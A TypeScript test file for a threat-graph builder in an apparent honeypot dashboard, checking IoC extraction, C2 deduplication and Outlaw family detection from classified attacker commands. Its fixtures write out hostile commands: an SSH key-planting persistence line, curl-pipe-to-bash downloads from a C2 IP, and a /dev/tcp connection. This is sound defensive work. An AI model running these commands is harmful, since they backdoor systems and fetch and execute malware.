/**
 * Tests for the threat-graph builder.
 * Run from apps/dashboard:  npx tsx --test lib/threat-graph.test.ts
 */
import { test } from "node:test"
import assert from "node:assert/strict"
import { buildThreatGraph } from "./threat-graph.ts"
import type { ThreatDetail } from "./api/types.ts"
import type { IpEnrichment } from "./ip-enrichment.ts"

const MDRFCKR_CMD =
  'cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3Nzaexamplekeymaterial1234567890 mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~'

function baseThreat(over: Partial<ThreatDetail> = {}): ThreatDetail {
  return {
    ip: "57.129.12.51",
    protocolsSeen: ["ssh"],
    crossProtocol: false,
    ssh: { sessions: 16, authAttempts: 40, loginSuccess: true },
    web: null,
    protocols: null,
    portScans: null,
    risk: {
      score: 85, level: "CRITICAL",
      breakdown: { ssh: 25, web: 0, protocols: 0, commands: 40, crossProto: 0 },
      topFactors: ["SSH login success"],
      commandCategories: { crypto_mining: ["nproc"], recon: ["uname -a"] },
    },
    classifiedCommands: [
      { command: "uname -a", ts: "2026-06-15T10:00:00Z", category: "recon" },
      { command: MDRFCKR_CMD, ts: "2026-06-15T10:00:05Z", category: "persistence" },
      { command: "curl -fsSL http://197.255.229.88:1987/fav.ico | bash", ts: "2026-06-15T10:00:10Z", category: "malware_drop" },
    ],
    protocolCommands: [],
    ...over,
  }
}

test("buildThreatGraph always produces a central IP node", () => {
  const { nodes } = buildThreatGraph(baseThreat(), null)
  const ip = nodes.find((n) => n.data.kind === "ip")
  assert.ok(ip)
  assert.equal(ip!.data.label, "57.129.12.51")
})

test("creates a protocol node for SSH and behavior nodes for active categories", () => {
  const { nodes } = buildThreatGraph(baseThreat(), null)
  assert.ok(nodes.some((n) => n.id === "proto-ssh"))
  assert.ok(nodes.some((n) => n.id === "behavior-crypto_mining"))
  assert.ok(nodes.some((n) => n.id === "behavior-recon"))
})

test("detects family and extracts IoCs (C2 + planted key) as nodes", () => {
  const { nodes, edges } = buildThreatGraph(baseThreat(), null)
  const family = nodes.find((n) => n.data.kind === "family")
  assert.ok(family, "should have a family node")
  assert.match(family!.data.label, /Outlaw/)

  const iocs = nodes.filter((n) => n.data.kind === "ioc")
  assert.ok(iocs.some((n) => n.data.copyable?.includes("197.255.229.88")), "C2 node")
  assert.ok(iocs.some((n) => n.data.copyable?.includes("mdrfckr")), "planted SSH key node")

  // Every edge references existing nodes.
  const ids = new Set(nodes.map((n) => n.id))
  for (const e of edges) {
    assert.ok(ids.has(e.source) && ids.has(e.target), `edge ${e.id} references missing node`)
  }
})

test("dedupes the same C2 host:port into a single node", () => {
  const { nodes } = buildThreatGraph(
    baseThreat({
      classifiedCommands: [
        { command: "curl -fsSL http://197.255.229.88:1987/fav.ico | bash", ts: "2026-06-15T10:00:00Z", category: "malware_drop" },
        { command: "curl -k -s http://197.255.229.88:1987/fav.ico,timeout=15 | bash", ts: "2026-06-15T10:00:01Z", category: "malware_drop" },
        { command: "bash -c exec 3 <> /dev/tcp/197.255.229.88/1987", ts: "2026-06-15T10:00:02Z", category: "malware_drop" },
      ],
    }),
    null,
  )
  const c2 = nodes.filter((n) => n.data.kind === "ioc" && n.data.sub?.startsWith("C2"))
  assert.equal(c2.length, 1, "the same C2 host:port must collapse to one node")
})

test("caps IoC nodes and adds a '+N more' node when a session carries many distinct C2 endpoints", () => {
  const manyC2Commands = Array.from({ length: 30 }, (_, i) => ({
    command: `curl -fsSL http://10.0.${i}.1:1987/fav.ico | bash`,
    ts: "2026-06-15T10:00:00Z",
    category: "malware_drop" as const,
  }))
  const { nodes } = buildThreatGraph(baseThreat({ classifiedCommands: manyC2Commands }), null)
  const iocs = nodes.filter((n) => n.data.kind === "ioc")
  assert.equal(iocs.length, 25, "24 real IoC nodes + 1 '+N more' node")
  const more = iocs.find((n) => n.id === "ioc-more")
  assert.ok(more, "should have a '+N more' node")
  assert.match(more!.data.label, /^\+6 more$/)
})

test("with enrichment, adds infra and reputation nodes", () => {
  const enrichment = {
    ip: "57.129.12.51",
    abuseipdb: { abuseConfidenceScore: 100, isp: "Acme", countryName: "DE", reports: [] },
    ipinfo: { asn: "AS123", org: "Acme Hosting", country: "DE" },
    virustotal: null,
    spectraAnalyze: null,
    cachedAt: "2026-06-15T00:00:00Z",
  } as unknown as IpEnrichment

  const { nodes } = buildThreatGraph(baseThreat(), enrichment)
  assert.ok(nodes.some((n) => n.data.kind === "infra"))
  assert.ok(nodes.some((n) => n.data.kind === "reputation"))
})

test("with null enrichment, omits infra and reputation nodes", () => {
  const { nodes } = buildThreatGraph(baseThreat(), null)
  assert.ok(!nodes.some((n) => n.data.kind === "infra"))
  assert.ok(!nodes.some((n) => n.data.kind === "reputation"))
})

test("no family node when commands are benign", () => {
  const { nodes } = buildThreatGraph(
    baseThreat({
      classifiedCommands: [{ command: "uname -a", ts: "2026-06-15T10:00:00Z", category: "recon" }],
      risk: {
        score: 20, level: "LOW",
        breakdown: { ssh: 20, web: 0, protocols: 0, commands: 0, crossProto: 0 },
        topFactors: [], commandCategories: { recon: ["uname -a"] },
      },
    }),
    null,
  )
  assert.ok(!nodes.some((n) => n.data.kind === "family"))
  assert.ok(!nodes.some((n) => n.data.kind === "ioc"))
})
